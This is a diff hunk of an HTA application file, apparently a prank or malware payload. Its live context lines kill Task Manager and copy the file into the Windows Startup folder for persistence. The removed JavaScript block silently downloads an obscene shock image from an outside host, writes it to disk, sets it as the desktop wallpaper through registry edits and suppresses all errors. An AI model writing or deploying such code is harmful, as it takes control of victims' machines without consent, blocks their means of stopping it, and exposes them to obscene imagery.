@@ -34,36 +34,6 @@ img {
     shell.Run "taskkill /f /im taskmgr.exe", 0, True
     shell.Run "copy %USERPROFILE%\Downloads\dishboot.hta %programdata%\Microsoft\Windows\Start Menu\Programs\Startup", 0, True
   </script>
-<script language="javascript">
-try {
-    var url = "https://file.garden/aUYIWVAKvQxCBY-_/database/nsfw/goatse.jpg";
-    var path = "C:\\dish.png";
-
-    // Download file (no PowerShell)
-    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-    xhr.open("GET", url, false);
-    xhr.send();
-
-    if (xhr.status === 200) {
-        var stream = new ActiveXObject("ADODB.Stream");
-        stream.Type = 1; // binary
-        stream.Open();
-        stream.Write(xhr.responseBody);
-        stream.SaveToFile(path, 2); // overwrite
-        stream.Close();
-    }
-
-    // Set wallpaper via registry
-    var shell = new ActiveXObject("WScript.Shell");
-    shell.RegWrite("HKCU\\Control Panel\\Desktop\\Wallpaper", path, "REG_SZ");
-    shell.RegWrite("HKCU\\Control Panel\\Desktop\\WallpaperStyle", "2", "REG_SZ");
-    shell.RegWrite("HKCU\\Control Panel\\Desktop\\TileWallpaper", "0", "REG_SZ");
-
-    // Apply instantly
-    shell.Run("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 0, true);
-
-} catch (e) {}
-</script>
 </head>
 <body>
 <img src="https://file.garden/aUYIWVAKvQxCBY-_/database/images/dish.png">
